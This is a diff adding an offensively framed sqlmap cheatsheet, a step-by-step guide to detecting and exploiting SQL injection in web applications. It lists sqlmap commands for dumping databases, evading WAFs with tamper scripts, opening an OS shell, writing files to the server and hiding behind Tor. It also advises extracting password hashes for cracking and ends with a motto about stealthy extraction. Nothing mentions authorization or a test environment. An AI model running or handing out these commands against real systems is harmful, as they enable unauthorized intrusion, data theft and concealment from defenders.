@@ -1,0 +1,87 @@
+┌───────────────────────────────────────────────────────────────┐
+│                     ZYA'S SQLMAP CHEATSHEET                   │
+│                      TACTICAL GUIDE                           │
+└───────────────────────────────────────────────────────────────┘
+
+MISSION:
+Detect and exploit SQL injection vulnerabilities in web applications,
+extract data, and gain deeper access through database compromise.
+
+───────────────────────────────
+QUICK DEPLOYMENT PROTOCOL
+───────────────────────────────
+1️⃣ Identify target URL with injectable parameters.  
+2️⃣ Launch sqlmap with target URL and specify injection points.  
+3️⃣ Use risk and level flags to control scan depth and aggressiveness.  
+4️⃣ Enumerate databases, tables, and columns.  
+5️⃣ Extract data, dump tables, or execute custom SQL queries.  
+6️⃣ Attempt privilege escalation via file write, command execution, or shell.  
+7️⃣ Analyze results and pivot for further exploitation.
+
+───────────────────────────────
+COMMON COMMANDS & OPTIONS
+───────────────────────────────
+- Basic injection test:  
+  `sqlmap -u "http://target.com/page.php?id=1"`
+
+- Specify HTTP method:  
+  `--method=POST`
+
+- Use data POST body:  
+  `--data="param1=value1&param2=value2"`
+
+- Set risk and level (1-5):  
+  `--risk=3 --level=5`
+
+- Enumerate databases:  
+  `--dbs`
+
+- Enumerate tables:  
+  `-D <database> --tables`
+
+- Enumerate columns:  
+  `-D <database> -T <table> --columns`
+
+- Dump data:  
+  `-D <database> -T <table> -C <columns> --dump`
+
+- Use tamper scripts to evade WAF:  
+  `--tamper=<scriptname>`
+
+- Get current user and database version:  
+  `--current-user --dbms-version`
+
+- OS command execution (if vulnerable):  
+  `--os-shell`
+
+- File upload or download:  
+  `--file-write=<file> --file-dest=<destination>`
+
+- Use proxy or TOR network:  
+  `--proxy=http://127.0.0.1:8080`  
+  `--tor --tor-type=SOCKS5`
+
+───────────────────────────────
+INJECTION TECHNIQUES
+───────────────────────────────
+- Boolean-based blind  
+- Time-based blind  
+- Error-based  
+- UNION query-based  
+- Stacked queries  
+- Out-of-band (OOB) injection
+
+───────────────────────────────
+TACTICAL TIPS
+───────────────────────────────
+- Always test with low risk and level before ramping up aggression.  
+- Use `--batch` for non-interactive mode in scripts or automation.  
+- Leverage tamper scripts against WAF/IPS protections.  
+- Extract password hashes for offline cracking if available.  
+- Combine with proxy tools (Burp) for deeper manual inspection.  
+- Validate findings manually to avoid false positives.
+
+───────────────────────────────
+FINAL COMMANDMENT:
+“Inject with precision, extract with stealth; turn data into dominion.”
+───────────────────────────────
